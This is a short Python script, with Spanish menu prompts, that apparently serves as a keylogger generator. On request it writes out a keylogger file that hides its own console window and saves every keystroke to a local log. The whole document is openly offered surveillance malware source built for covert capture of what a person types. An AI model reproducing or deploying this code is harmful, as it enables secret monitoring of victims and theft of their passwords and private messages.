import os

os.system("clear")

print("")

os.system("clear && figlet Keylogger | lolcat")

def menu_principal():
    while True:
        print("\n[1] Crear keylogger")
        print("[2] Salir")
        opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
        if opcion == "1":
            codigo = '''from pynput import keyboard
import win32console
import win32gui
import keylogger
            
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
            '''
            with open("keylogger.py", "w") as archivo:
                archivo.write(codigo)
                print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
        
        if opcion == "2":
            break

menu_principal()
